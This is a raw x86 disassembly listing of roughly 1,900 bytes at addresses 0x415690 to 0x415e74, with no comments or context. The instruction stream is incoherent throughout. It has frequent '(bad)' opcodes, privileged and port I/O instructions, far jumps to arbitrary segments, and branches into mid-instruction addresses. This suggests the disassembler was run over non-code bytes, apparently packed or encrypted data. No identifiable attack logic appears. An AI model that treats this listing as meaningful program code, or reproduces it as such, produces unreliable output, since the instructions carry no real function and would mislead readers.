  415690:	jnp    0x415630
  415692:	pop    eax
  415693:	sbb    DWORD PTR [edx-0xdd938d5],esi
  415699:	cmp    bl,ah
  41569b:	mov    ebp,0x4728ed79
  4156a0:	(bad)  
  4156a1:	push   0x56
  4156a3:	cmp    BYTE PTR [ebp-0x7a48ff29],0xa7
  4156aa:	xor    BYTE PTR [ebp+eax*2+0x711fbe99],ah
  4156b1:	push   ebx
  4156b2:	add    edi,DWORD PTR [edi+0x2e4b3fb7]
  4156b8:	enter  0x37b6,0x82
  4156bc:	jo     0x41567d
  4156be:	test   DWORD PTR [ecx],0x7435ea3e
  4156c4:	dec    ecx
  4156c5:	sbb    cl,BYTE PTR [edi+ebx*8-0x70e8a0de]
  4156cc:	xor    BYTE PTR [ecx-0x512c9604],dl
  4156d2:	cmp    eax,0xd66c4388
  4156d7:	call   0x262ec5
  4156dc:	das    
  4156dd:	movups XMMWORD PTR [edi],xmm4
  4156e0:	push   0xc622e25e
  4156e5:	lods   eax,DWORD PTR ds:[esi]
  4156e6:	dec    ecx
  4156e7:	pop    ss
  4156e8:	and    eax,DWORD PTR [esp+edx*2+0x47]
  4156ec:	bound  eax,QWORD PTR [eax]
  4156ee:	inc    esp
  4156ef:	sti    
  4156f0:	mov    bl,0xee
  4156f2:	jne    0x4156ff
  4156f4:	dec    ebp
  4156f5:	xchg   ecx,eax
  4156f6:	in     al,dx
  4156f7:	pop    edi
  4156f8:	loopne 0x415712
  4156fa:	es leave 
  4156fc:	aas    
  4156fd:	push   esp
  4156fe:	sbb    eax,0x9c1e1c63
  415703:	mov    ah,0x72
  415705:	xchg   ecx,eax
  415706:	cld    
  415707:	iret   
  415708:	ins    BYTE PTR es:[edi],dx
  415709:	fs sub ebp,ebx
  41570c:	fstp   QWORD PTR [esi+0x4c6a42fa]
  415712:	sti    
  415713:	test   eax,0xd27aef42
  415718:	or     al,0x94
  41571a:	sub    eax,0xe7b57f0d
  41571f:	jl     0x4156b5
  415721:	jno    0x415794
  415723:	push   0xce9dc6e6
  415728:	sbb    al,0x85
  41572a:	jmp    0x41573c
  41572c:	sub    BYTE PTR [edx+0x86c8a53],0x95
  415733:	pop    ds
  415734:	pop    es
  415735:	add    ah,BYTE PTR [ebp+0x7bfc3663]
  41573b:	(bad)  
  41573c:	jb     0x4156f0
  41573e:	popf   
  41573f:	jmp    0x17a0:0xb19852d5
  415746:	jnp    0x4156c8
  415748:	pop    eax
  415749:	test   DWORD PTR [ebx],ecx
  41574b:	inc    ebp
  41574c:	xor    eax,0xfbac23b2
  415751:	cmp    esp,eax
  415753:	push   ds
  415754:	bound  ecx,QWORD PTR [esi+esi*8-0x36e7df11]
  41575b:	ret    
  41575c:	out    dx,eax
  41575d:	test   al,0x44
  41575f:	jl     0x41575a
  415761:	push   ecx
  415762:	adc    DWORD PTR [edi+0x3b5a680a],eax
  415768:	xchg   ebp,eax
  415769:	fiadd  DWORD PTR [ebp+0x1342289e]
  41576f:	jae    0x4156f8
  415771:	in     al,0xe
  415773:	iret   
  415774:	mov    ecx,ebp
  415776:	inc    ebp
  415777:	and    BYTE PTR [eax-0x5e],ah
  41577a:	rcl    BYTE PTR [edi+ecx*2],1
  41577d:	mov    edx,0x6208dc30
  415782:	xchg   ebx,eax
  415783:	leave  
  415784:	inc    BYTE PTR [edx]
  415786:	inc    edi
  415787:	mov    dh,0xd4
  415789:	push   ds
  41578a:	xor    eax,0x840847fd
  41578f:	sbb    al,0x16
  415791:	enter  0x9c04,0xde
  415795:	lock sbb al,0x18
  415798:	daa    
  415799:	stc    
  41579a:	or     eax,DWORD PTR [edi-0x56]
  41579d:	dec    ecx
  41579e:	daa    
  41579f:	ss mov edi,0x8b579fd0
  4157a5:	mov    edx,0x16b89d9
  4157aa:	addr16 (bad) 
  4157ad:	dec    edx
  4157ae:	dec    esp
  4157af:	mov    bh,0xba
  4157b1:	mov    edi,0x2de0c0c
  4157b6:	inc    edi
  4157b7:	pop    es
  4157b8:	div    DWORD PTR [ecx]
  4157ba:	add    BYTE PTR [edi],dl
  4157bc:	cmc    
  4157bd:	test   eax,0x4fbf3e67
  4157c2:	addr16 or al,0xf0
  4157c5:	pop    es
  4157c6:	clc    
  4157c7:	mov    esi,0x5fa6c589
  4157cc:	call   0x34be:0xe8d8f1ce
  4157d3:	bound  ecx,QWORD PTR [eax-0x274dc6bb]
  4157d9:	mov    dh,0x2e
  4157db:	jp     0x41582b
  4157dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157de:	sbb    eax,0x1de09183
  4157e3:	pop    ebx
  4157e4:	pop    esi
  4157e6:	das    
  4157e7:	data16 out dx,al
  4157e9:	cmc    
  4157ea:	fiadd  WORD PTR [edi-0x48bc765a]
  4157f0:	add    ecx,edi
  4157f2:	arpl   sp,si
  4157f4:	sbb    eax,0xddad5516
  4157f9:	out    dx,al
  4157fa:	scas   eax,DWORD PTR es:[edi]
  4157fb:	sub    DWORD PTR ds:0x5bb9814f,ecx
  415801:	sbb    eax,0xf851c22a
  415806:	inc    ebp
  415807:	ror    DWORD PTR [ebp+0x62],0xbf
  41580b:	hlt    
  41580c:	stos   DWORD PTR es:[edi],eax
  41580d:	out    0xf5,eax
  41580f:	das    
  415810:	bnd jo 0x415799
  415813:	adc    esp,DWORD PTR [esi-0x45]
  415816:	push   ebx
  415817:	je     0x4157d3
  415819:	cmc    
  41581a:	stc    
  41581b:	mov    ebp,0x196afb0f
  415820:	inc    esi
  415821:	xor    ebp,esi
  415823:	sar    ah,1
  415825:	(bad)  
  415826:	sub    eax,0x58f32cae
  41582b:	fsubrp st(2),st
  41582d:	and    eax,0xd9a6ff0
  415832:	sub    al,0x35
  415834:	add    eax,0xfa3ffa7e
  415839:	rcl    BYTE PTR [edx-0x159d20a8],1
  41583f:	push   0x6d82fdc
  415844:	aam    0xa4
  415846:	xchg   bl,bh
  415848:	sar    BYTE PTR [eax*8+0x465e61d0],1
  41584f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415850:	lea    eax,[eax-0x2d]
  415853:	addr16 and al,0x4f
  415856:	mov    ds:0x735e5c40,eax
  41585b:	sbb    dh,cl
  41585d:	push   ds
  41585e:	push   0x23
  415860:	test   BYTE PTR [ecx+eax*4+0x38],ch
  415864:	adc    cl,ah
  415866:	fmul   st(0),st
  415868:	retf   
  415869:	inc    ebx
  41586a:	sbb    ecx,esp
  41586c:	adc    DWORD PTR [ecx],eax
  41586e:	sub    al,0x4c
  415870:	dec    ecx
  415871:	das    
  415872:	ret    
  415873:	jle    0x41589e
  415875:	dec    esi
  415876:	shl    esi,0xb4
  415879:	shl    BYTE PTR [ecx],0x43
  41587c:	xchg   esp,eax
  41587d:	cld    
  41587e:	shl    bh,0x39
  415881:	sahf   
  415882:	fnstsw WORD PTR [eax+ebp*8+0x7f3dae9c]
  415889:	pop    esi
  41588a:	ins    DWORD PTR es:[edi],dx
  41588b:	or     edi,DWORD PTR [edi-0x17d0ae0d]
  415891:	in     eax,0x71
  415893:	ret    0x4813
  415896:	jmp    0xecdc:0x2e61dc97
  41589d:	push   eax
  41589e:	rol    BYTE PTR [ebx+0xef432b2],1
  4158a4:	xor    eax,0x87eeaa1b
  4158a9:	cmp    ch,dl
  4158ab:	test   BYTE PTR [edi-0x38e59607],ah
  4158b1:	test   BYTE PTR [eax-0x7af5bc11],al
  4158b7:	bsf    edi,DWORD PTR [edi+0x44]
  4158bb:	fadd   QWORD PTR [eax-0x55]
  4158be:	mov    bh,0xa1
  4158c0:	lods   al,BYTE PTR ds:[esi]
  4158c1:	sub    esp,DWORD PTR [esi+eax*4+0x44]
  4158c5:	imul   edi,DWORD PTR [eax-0x52],0xffffff84
  4158c9:	retf   0xccef
  4158cc:	or     al,0xe9
  4158ce:	xchg   dh,bh
  4158d0:	popf   
  4158d1:	ret    0xf689
  4158d4:	sbb    ebp,DWORD PTR [eax]
  4158d6:	push   ebx
  4158d7:	nop
  4158d8:	jne    0x4158b4
  4158da:	mov    ch,0x7f
  4158dc:	cmp    DWORD PTR [eax],ebp
  4158de:	mov    bl,0x5a
  4158e0:	jecxz  0x41590a
  4158e2:	xchg   ecx,eax
  4158e3:	mov    dl,0x60
  4158e5:	jl     0x41587b
  4158e7:	dec    edx
  4158e8:	push   edi
  4158e9:	inc    esi
  4158ea:	jmp    0x41593c
  4158ec:	(bad)  
  4158ed:	xor    eax,0x7e1a1a6
  4158f2:	xchg   edi,eax
  4158f3:	pusha  
  4158f4:	jbe    0x4158d9
  4158f6:	mov    WORD PTR [esi-0x5559827b],?
  4158fc:	inc    ecx
  4158fd:	daa    
  4158fe:	mov    cl,dh
  415900:	scas   eax,DWORD PTR es:[edi]
  415901:	push   ecx
  415902:	(bad)  
  415903:	in     eax,0x27
  415905:	push   edi
  415906:	pop    ebx
  415907:	sbb    BYTE PTR [ebx],bh
  415909:	imul   DWORD PTR [edi+0x61]
  41590c:	outs   dx,DWORD PTR ds:[esi]
  41590d:	or     esp,DWORD PTR [esi+0xf970924]
  415913:	and    dl,BYTE PTR [ebx+0x6ddb0979]
  415919:	mov    edx,0xbe0ea4ab
  41591e:	mov    ds:0xc9c20a3,al
  415923:	sar    BYTE PTR [eax-0x4c],cl
  415926:	push   edi
  415927:	dec    esi
  415928:	xchg   ecx,eax
  415929:	mov    ch,0x53
  41592b:	jl     0x41595d
  41592d:	pop    esi
  41592e:	cmc    
  41592f:	jns    0x4158cf
  415931:	sbb    al,0xfa
  415933:	inc    ecx
  415934:	xchg   ebx,eax
  415935:	push   edi
  415936:	cmp    BYTE PTR [ecx],0x58
  415939:	in     eax,0x5
  41593b:	sub    edi,0xfffffff5
  41593e:	leave  
  41593f:	call   0x142e:0x8fa85d49
  415946:	adc    BYTE PTR [eax-0x1],cl
  415949:	jle    0x415982
  41594b:	push   0xb69a3e36
  415950:	add    eax,0x181d9992
  415955:	out    0x78,eax
  415957:	xlat   BYTE PTR ds:[ebx]
  415958:	clc    
  415959:	sahf   
  41595a:	ss out 0xad,eax
  41595d:	daa    
  41595e:	sub    BYTE PTR [ecx+0xb],bl
  415961:	outs   dx,DWORD PTR ds:[esi]
  415962:	lahf   
  415963:	inc    edx
  415964:	sub    dl,dh
  415966:	aaa    
  415967:	jmp    0x41596c
  415969:	ins    DWORD PTR es:[edi],dx
  41596a:	(bad)  
  41596b:	jp     0x41596d
  41596d:	js     0x41598b
  41596f:	jg     0x415981
  415971:	xlat   BYTE PTR ds:[ebx]
  415972:	fwait
  415973:	dec    esi
  415974:	rol    DWORD PTR [edi+0x7b],1
  415977:	pop    ebx
  415978:	cli    
  415979:	mov    bh,0x51
  41597b:	xchg   ebp,eax
  41597c:	das    
  41597d:	add    BYTE PTR [eax-0x2d34ca65],bh
  415983:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415984:	jbe    0x415981
  415986:	idiv   DWORD PTR [ebx]
  415988:	lds    edx,FWORD PTR ds:0x6bcc8959
  41598e:	je     0x41598a
  415990:	(bad)  
  415991:	adc    eax,0x3e712392
  415996:	ss aas 
  415998:	sub    dl,BYTE PTR cs:[esi-0x3fa12055]
  41599f:	mov    edx,0x90253a48
  4159a4:	retf   
  4159a5:	repz mov al,BYTE PTR es:[ebp-0x67f34aa]
  4159ad:	fdiv   QWORD PTR [edx+0x555c2e11]
  4159b3:	xlat   BYTE PTR ds:[ebx]
  4159b4:	mov    ch,BYTE PTR es:[ebx+0xb]
  4159b8:	lock ja 0x41594b
  4159bb:	or     DWORD PTR [eax-0x373eaf79],esi
  4159c1:	push   edi
  4159c2:	mov    eax,ds:0x823577f9
  4159c7:	and    bl,dh
  4159c9:	cmp    ebx,DWORD PTR [eax]
  4159cb:	pop    ss
  4159cc:	pop    ebp
  4159cd:	pop    eax
  4159ce:	out    dx,al
  4159cf:	mov    ecx,0xb1a4792c
  4159d4:	aam    0xf4
  4159d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159d7:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4159d9:	mov    DWORD PTR [edx],0x8ee3945a
  4159df:	neg    ebx
  4159e1:	bswap  esp
  4159e3:	pop    edx
  4159e4:	cwde   
  4159e5:	cmp    ch,BYTE PTR [ecx]
  4159e7:	lahf   
  4159e8:	repnz sub dl,cl
  4159eb:	sbb    eax,0xe5fce097
  4159f0:	cwde   
  4159f1:	push   ss
  4159f2:	rcr    BYTE PTR [eax-0x59],0x8f
  4159f6:	mov    BYTE PTR [eax+0x5b688531],cl
  4159fc:	push   0x11
  4159fe:	push   edi
  4159ff:	mov    dh,0x20
  415a01:	je     0x415a70
  415a03:	jecxz  0x4159fc
  415a05:	scas   al,BYTE PTR es:[edi]
  415a06:	and    al,0x34
  415a08:	lea    esi,[edx-0x451f6fe8]
  415a0e:	test   al,0x5
  415a10:	lock pushf 
  415a12:	add    al,0x78
  415a14:	xchg   bh,cl
  415a16:	jno    0x415a15
  415a18:	pop    edx
  415a19:	cmp    eax,0xc4a3d70c
  415a1e:	add    bl,BYTE PTR [eax]
  415a20:	das    
  415a21:	inc    edx
  415a23:	and    al,0x3d
  415a25:	imul   ecx,DWORD PTR [ebx],0xcc1a01bf
  415a2b:	xor    BYTE PTR [ebx+0x45e3d68],bh
  415a31:	cmp    BYTE PTR [esi+0x5e379144],ch
  415a37:	xchg   ecx,eax
  415a38:	add    ah,BYTE PTR [eax+0x3a]
  415a3b:	xchg   edi,eax
  415a3c:	(bad)  
  415a3d:	cmp    eax,0xe4c776d1
  415a42:	lods   al,BYTE PTR ds:[esi]
  415a43:	pop    es
  415a44:	stc    
  415a45:	(bad)  
  415a46:	fnsave [esi-0x3c]
  415a49:	xchg   esi,eax
  415a4a:	and    BYTE PTR [edi+eiz*8],dl
  415a4d:	lock fisttp QWORD PTR cs:0x2c021fbc
  415a55:	cli    
  415a56:	jnp    0x415a59
  415a58:	mov    esp,DWORD PTR ds:0x516d70ee
  415a5e:	sub    al,0xd
  415a60:	adc    BYTE PTR [eax+0x14242dad],ah
  415a66:	or     al,0x32
  415a68:	mov    DWORD PTR [ecx-0x5],edi
  415a6b:	(bad)  
  415a6c:	jnp    0x415a26
  415a6e:	xchg   DWORD PTR ds:0x9767a994,ebx
  415a74:	mov    DWORD PTR ds:0xce57de09,ebx
  415a7a:	jmp    0xff1d:0x6900e938
  415a81:	add    eax,0x1120b0d1
  415a86:	test   eax,0x6082dcfb
  415a8b:	pop    esi
  415a8c:	sub    al,0x5f
  415a8e:	pop    ecx
  415a8f:	fdiv   DWORD PTR [eax-0x7676d1d8]
  415a95:	add    edi,ebp
  415a97:	xchg   ebp,eax
  415a98:	es push ss
  415a9a:	jne    0x415a5a
  415a9c:	fdiv   DWORD PTR [edx]
  415a9e:	ja     0x415a4b
  415aa0:	add    al,0x5a
  415aa2:	sbb    DWORD PTR ds:0x5343317e,esp
  415aa8:	add    BYTE PTR [ebp-0x2846831f],bl
  415aae:	enter  0x4342,0xf4
  415ab2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ab3:	push   cs
  415ab4:	push   cs
  415ab5:	pop    esp
  415ab6:	add    ebx,ecx
  415ab8:	lods   eax,DWORD PTR ds:[esi]
  415ab9:	jle    0x415ab4
  415abb:	(bad)  
  415abc:	adc    dh,ah
  415abe:	rcr    BYTE PTR [eax+0x6ea93c36],1
  415ac4:	dec    ebp
  415ac5:	out    dx,eax
  415ac6:	dec    esi
  415ac7:	xor    eax,0xaf6b3889
  415acc:	inc    ebp
  415acd:	xor    eax,DWORD PTR [eax]
  415acf:	sbb    al,0xc7
  415ad1:	push   0xffffffcf
  415ad3:	adc    ch,ch
  415ad5:	pop    edi
  415ad6:	cli    
  415ad7:	add    dh,BYTE PTR [ebx]
  415ad9:	test   al,0x3a
  415adb:	pop    esp
  415adc:	stos   DWORD PTR es:[edi],eax
  415add:	jbe    0x415aaf
  415adf:	imul   edi,DWORD PTR [esi+esi*1+0x1c17d8bc],0x27
  415ae7:	test   DWORD PTR [eax-0x582bd3d0],ebp
  415aed:	inc    eax
  415aee:	jmp    0x415a9b
  415af0:	or     al,0xe4
  415af2:	cmp    DWORD PTR [ecx],ebx
  415af4:	out    dx,eax
  415af5:	dec    ecx
  415af6:	mov    eax,ds:0x713f726c
  415afb:	cmp    al,0xb8
  415afd:	in     eax,0xde
  415aff:	dec    edi
  415b00:	xchg   edx,eax
  415b01:	push   ds
  415b02:	xchg   esi,eax
  415b03:	aas    
  415b04:	imul   ebx,DWORD PTR [edx-0x370ff5d2],0x3274ba0d
  415b0e:	pop    edx
  415b0f:	mov    al,0x15
  415b11:	rcl    BYTE PTR [ebx-0x443c6d1e],1
  415b17:	push   ds
  415b18:	cmp    al,0x72
  415b1a:	inc    edi
  415b1b:	mov    ecx,0x8d0b6b0e
  415b20:	mov    BYTE PTR [edx+0x5c],bh
  415b23:	addr16 in al,dx
  415b25:	cmp    al,0xb7
  415b27:	mov    ebx,0x9baf470c
  415b2c:	add    dh,BYTE PTR [edi-0x28]
  415b2f:	xor    dl,BYTE PTR [edi+edi*2-0x68]
  415b33:	jp     0x415ac5
  415b35:	jns    0x415b6b
  415b37:	push   edx
  415b38:	cld    
  415b39:	sub    esp,DWORD PTR [ecx+0x45f214c3]
  415b3f:	aaa    
  415b40:	sbb    eax,ebp
  415b42:	ficomp WORD PTR [ebp+0x1c]
  415b45:	(bad)  
  415b46:	retf   0x71ef
  415b49:	xor    al,0xc0
  415b4b:	cld    
  415b4c:	sbb    BYTE PTR [edx-0x10],ah
  415b4f:	push   es
  415b50:	mov    eax,ds:0x57bb361e
  415b55:	and    eax,0x8d986902
  415b5a:	sahf   
  415b5b:	dec    esp
  415b5c:	mov    ecx,0x7d18083a
  415b61:	or     eax,0x5e00ccd4
  415b66:	ins    DWORD PTR es:[edi],dx
  415b67:	mov    ecx,0x514dc33e
  415b6c:	xchg   esp,eax
  415b6d:	sub    bl,al
  415b6f:	lahf   
  415b70:	mov    ds:0xaa045ccb,eax
  415b75:	sub    cl,BYTE PTR [esi]
  415b77:	sub    BYTE PTR [edi-0x1d166c0b],cl
  415b7d:	fwait
  415b7e:	in     al,dx
  415b7f:	lods   al,BYTE PTR ds:[esi]
  415b80:	inc    edx
  415b81:	lea    eax,[ecx]
  415b83:	not    BYTE PTR [ebx+0x2986a6c0]
  415b89:	push   edx
  415b8a:	gs ss pop edx
  415b8d:	and    al,0x61
  415b8f:	jmp    0x415be0
  415b91:	fwait
  415b92:	jmp    0x415b8b
  415b94:	loop   0x415b91
  415b96:	lea    esp,[eax+edi*4+0x11532391]
  415b9d:	je     0x415b8e
  415b9f:	loop   0x415ba0
  415ba1:	scas   eax,DWORD PTR es:[edi]
  415ba2:	mov    ah,0x86
  415ba4:	addr16 mov dh,0x89
  415ba7:	xor    eax,0x74d6515f
  415bac:	pushf  
  415bad:	or     DWORD PTR [edi-0x1ae65104],ebx
  415bb3:	xor    al,dh
  415bb5:	clc    
  415bb6:	sbb    eax,0xe258923f
  415bbb:	jnp    0x415c08
  415bbd:	inc    esi
  415bbe:	jno    0x415b7a
  415bc0:	inc    eax
  415bc1:	leave  
  415bc2:	sbb    BYTE PTR [bp+si+0x16],al
  415bc6:	push   ebp
  415bc7:	inc    ecx
  415bc8:	sbb    BYTE PTR [edi-0x5d],0xd1
  415bcc:	jmp    0x909a50a4
  415bd1:	xchg   ebx,eax
  415bd2:	adc    DWORD PTR [edx],ebp
  415bd4:	jl     0x415bf2
  415bd6:	xor    BYTE PTR es:[esi-0x44],bl
  415bda:	mov    bh,0x61
  415bdc:	push   ecx
  415bdd:	sbb    BYTE PTR [ecx],0x5
  415be0:	(bad)  
  415be1:	adc    esp,DWORD PTR [edx-0x3c5f4933]
  415be7:	retf   
  415be8:	cmp    esp,DWORD PTR [esi+0x30]
  415beb:	mov    esp,DWORD PTR ss:[esi-0x34]
  415bef:	not    DWORD PTR [esi]
  415bf1:	lods   eax,DWORD PTR ds:[esi]
  415bf2:	js     0x415ba7
  415bf4:	jp     0x415b9b
  415bf6:	jg     0x415c48
  415bf8:	xchg   ebx,eax
  415bf9:	or     eax,0x18956a30
  415bfe:	cmp    al,0xad
  415c00:	xchg   esp,eax
  415c01:	push   cs
  415c02:	push   ds
  415c03:	ja     0x415be8
  415c05:	sub    dh,bh
  415c07:	jns    0x415c7b
  415c09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c0a:	cmc    
  415c0b:	inc    ebp
  415c0c:	lock ja 0x415c15
  415c0f:	cmp    eax,0x54dd008e
  415c14:	cmc    
  415c15:	scas   eax,DWORD PTR es:[edi]
  415c16:	loop   0x415c45
  415c18:	int    0x87
  415c1a:	dec    eax
  415c1b:	mov    eax,ds:0xffa8e2fa
  415c20:	xor    ebp,DWORD PTR [edi+ebp*4]
  415c23:	clc    
  415c24:	dec    esp
  415c25:	cmp    DWORD PTR [ebx],ecx
  415c27:	jmp    FWORD PTR [edx*1+0x60975a30]
  415c2e:	(bad)  
  415c2f:	dec    ebp
  415c30:	push   cs
  415c31:	rcr    DWORD PTR [ecx],1
  415c33:	mov    cl,0x38
  415c35:	xlat   BYTE PTR ds:[ebx]
  415c36:	lods   eax,DWORD PTR ds:[esi]
  415c37:	addr16 aad 0xca
  415c3a:	jmp    0xb718:0xa3b5ec91
  415c41:	test   DWORD PTR gs:[eax-0x77f1c00b],ecx
  415c48:	loope  0x415c70
  415c4a:	int3   
  415c4b:	cmp    al,0x7d
  415c4d:	stos   BYTE PTR es:[edi],al
  415c4e:	inc    dh
  415c50:	ror    dl,1
  415c52:	xor    BYTE PTR [ebx],0xcf
  415c55:	arpl   bx,cx
  415c57:	mov    WORD PTR [ebx+eax*1-0x2a],fs
  415c5b:	add    eax,0x23141783
  415c60:	and    BYTE PTR [ebp+0x5ca11d3],dl
  415c66:	ror    DWORD PTR [ebx+0x5df71dc8],1
  415c6c:	es pop edi
  415c6e:	test   BYTE PTR [eax-0xbfb8011],0x2
  415c75:	mov    ?,ebx
  415c77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c78:	shl    DWORD PTR [edi+ebx*2],1
  415c7b:	rcr    ebx,1
  415c7d:	sbb    al,0xb2
  415c7f:	push   ebp
  415c80:	cld    
  415c81:	push   eax
  415c82:	mov    bl,0x6e
  415c84:	pop    ds
  415c85:	and    DWORD PTR [edx+0x6b1e92a5],esi
  415c8b:	test   al,0x68
  415c8d:	jp     0x415caf
  415c8f:	mov    ch,BYTE PTR [eax]
  415c91:	inc    edi
  415c92:	jo     0x415d04
  415c94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c95:	(bad)
  415c98:	pop    esi
  415c99:	fcom   QWORD PTR [edi-0x769e2967]
  415c9f:	call   0x8315231d
  415ca4:	rol    BYTE PTR [edx],0x13
  415ca7:	sub    ecx,DWORD PTR [ebx+0x7e]
  415caa:	sub    DWORD PTR [ecx+eax*4+0x8df83a9],ebx
  415cb1:	jp     0x415d1e
  415cb3:	bound  ecx,QWORD PTR [eax]
  415cb5:	mov    ds,WORD PTR [ebp+0xc]
  415cb8:	ins    DWORD PTR es:[edi],dx
  415cb9:	dec    esi
  415cba:	adc    ch,BYTE PTR [esp+ecx*2]
  415cbd:	inc    esp
  415cbe:	adc    ebx,edx
  415cc0:	sub    eax,0x5215b0f9
  415cc5:	(bad)  
  415cc6:	call   0x97b4a2b5
  415ccb:	mov    bh,0x89
  415ccd:	jno    0x415c73
  415ccf:	push   edi
  415cd0:	test   BYTE PTR [edx+0x2735c0fb],cl
  415cd6:	mov    ds:0x4da9d02b,eax
  415cdb:	xor    cl,BYTE PTR [ecx+edi*8+0x5c]
  415cdf:	xchg   ebx,eax
  415ce0:	div    BYTE PTR [esi]
  415ce2:	sbb    BYTE PTR [eax+ecx*2-0x4aed7f80],al
  415ce9:	mov    al,0x68
  415ceb:	lock adc BYTE PTR [edi-0x6c],bh
  415cef:	mov    dh,0xc5
  415cf1:	popf   
  415cf2:	fcmovnbe st,st(2)
  415cf4:	neg    BYTE PTR [eax+edi*1+0x55]
  415cf8:	test   BYTE PTR [ecx+0x1d64f450],ah
  415cfe:	xor    bl,BYTE PTR [ecx+0x119d2ae4]
  415d04:	das    
  415d05:	push   edx
  415d06:	or     al,0xee
  415d08:	inc    ebp
  415d09:	add    BYTE PTR [edi+0x751743f1],al
  415d0f:	arpl   WORD PTR [esi+0x16],dx
  415d12:	sub    eax,0x6408f04f
  415d17:	out    dx,al
  415d18:	sbb    bl,BYTE PTR [ebp+edi*8+0x502755a9]
  415d1f:	sti    
  415d20:	push   esi
  415d21:	push   esi
  415d22:	cld    
  415d23:	push   ss
  415d24:	test   al,0xce
  415d26:	in     eax,dx
  415d27:	arpl   WORD PTR [esi],cx
  415d29:	or     BYTE PTR [esi-0x6a969dfd],0xf3
  415d30:	inc    ecx
  415d31:	in     eax,0xb2
  415d33:	sub    ebp,DWORD PTR [esi]
  415d35:	xor    eax,0x4cea3e9c
  415d3a:	mov    cs,ebx
  415d3c:	pop    eax
  415d3d:	cmp    eax,0x472fa3d4
  415d42:	imul   edx,DWORD PTR [ecx+0x55b156a0],0x1e70cc8a
  415d4c:	pusha  
  415d4d:	sti    
  415d4e:	pop    edi
  415d4f:	mov    al,ds:0x3a0128ac
  415d54:	es inc edi
  415d56:	jecxz  0x415dcd
  415d58:	pushf  
  415d59:	sar    edi,0xe2
  415d5c:	loope  0x415cf1
  415d5e:	js     0x415d62
  415d60:	sbb    BYTE PTR [ecx-0x56],0x67
  415d64:	sar    bh,1
  415d66:	mov    ebp,0xfc51aa27
  415d6b:	jge    0x415d3c
  415d6d:	int    0x31
  415d6f:	mov    ds:0x2c6b3a16,eax
  415d74:	add    BYTE PTR [esp+eax*8+0x1f],ah
  415d78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d79:	mov    al,ds:0x435469c3
  415d7e:	in     eax,0xe8
  415d80:	mov    ah,0xb8
  415d82:	(bad)  
  415d83:	pop    DWORD PTR [esp+ebx*2-0x29]
  415d87:	cld    
  415d88:	dec    edx
  415d89:	and    edx,DWORD PTR [edi-0x10]
  415d8c:	jno    0x415dc2
  415d8e:	fdivr  DWORD PTR [edi-0x60ae991]
  415d94:	ror    DWORD PTR [esi],cl
  415d96:	jp     0x415df5
  415d98:	jecxz  0x415dd8
  415d9a:	cwde   
  415d9b:	sbb    eax,DWORD PTR [ecx+0x4d1510d0]
  415da1:	mov    eax,0xd99364e4
  415da6:	cmp    BYTE PTR [edi],0x22
  415da9:	fild   QWORD PTR [esi-0x60]
  415dac:	sbb    al,0xa4
  415dae:	adc    dh,BYTE PTR [ecx+0x1d]
  415db1:	jge    0x415dd3
  415db3:	and    edi,ecx
  415db5:	dec    BYTE PTR [ecx-0x1e]
  415db8:	and    esi,DWORD PTR [eax-0x32]
  415dbb:	and    ebp,DWORD PTR [ebx+0x7667899a]
  415dc1:	inc    esp
  415dc2:	mov    ebp,0x3c9f67fd
  415dc7:	aad    0xf7
  415dc9:	sti    
  415dca:	mov    edx,0xf5eb2ecf
  415dcf:	sub    al,0x5c
  415dd1:	aam    0xe7
  415dd3:	das    
  415dd4:	int3   
  415dd5:	fdivrp st(0),st
  415dd7:	dec    ebp
  415dd8:	mov    edi,0xdf384520
  415ddd:	cld    
  415dde:	inc    eax
  415ddf:	shr    DWORD PTR [edi],0x83
  415de2:	dec    esp
  415de3:	shl    cl,0xd
  415de6:	loope  0x415dbf
  415de8:	push   0x6a4851ef
  415ded:	jae    0x415e41
  415def:	push   0x3f
  415df1:	lahf   
  415df2:	out    0xf2,eax
  415df4:	mov    WORD PTR [ebp-0xd55f2b2],cs
  415dfa:	mov    edi,edx
  415dfc:	outs   dx,DWORD PTR ds:[esi]
  415dfd:	and    edi,edi
  415dff:	push   edx
  415e00:	(bad)  
  415e01:	stc    
  415e02:	pusha  
  415e03:	popa   
  415e04:	lahf   
  415e05:	test   BYTE PTR ds:[ebp+0x2f8903ea],ah
  415e0c:	hlt    
  415e0d:	sti    
  415e0e:	clc    
  415e0f:	or     al,0xba
  415e11:	mov    cl,0x67
  415e13:	push   ss
  415e14:	cmp    edx,DWORD PTR [edx+0x5a122e06]
  415e1a:	out    dx,eax
  415e1b:	test   al,0x3c
  415e1d:	add    dl,BYTE PTR [ebx]
  415e1f:	push   ebx
  415e20:	fwait
  415e21:	retf   
  415e22:	sbb    cl,dl
  415e24:	adc    ebp,0x2d
  415e27:	mov    ebx,0x6a02dfa
  415e2c:	shr    BYTE PTR [edi],1
  415e2e:	cs mov ch,dh
  415e31:	cmp    ch,ah
  415e33:	pop    ebp
  415e34:	add    al,bl
  415e36:	mov    eax,0x1a513560
  415e3b:	ins    DWORD PTR es:[edi],dx
  415e3c:	std    
  415e3d:	stc    
  415e3e:	daa    
  415e3f:	mov    dh,0x65
  415e41:	call   0x5cd64865
  415e46:	adc    al,0x1e
  415e48:	mov    ds:0xbe0a3b45,al
  415e4d:	inc    edx
  415e4e:	mov    ch,0x60
  415e50:	jmp    0xb211ab5f
  415e55:	imul   eax,DWORD PTR [eax],0x7f
  415e58:	retf   0xbb4d
  415e5b:	std    
  415e5c:	jl     0x415e6c
  415e5e:	daa    
  415e5f:	sti    
  415e60:	ret    
  415e61:	cli    
  415e62:	outs   dx,BYTE PTR ds:[esi]
  415e63:	push   ecx
  415e64:	dec    edx
  415e65:	pusha  
  415e66:	aaa    
  415e67:	dec    edi
  415e68:	xor    ebx,0x31
  415e6b:	nop
  415e6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e6d:	xchg   ecx,eax
  415e6e:	xchg   esi,eax
  415e6f:	lock mov ebx,DWORD PTR [ebp+0x12]
  415e73:	xchg   esi,eax
  415e74:	cld    
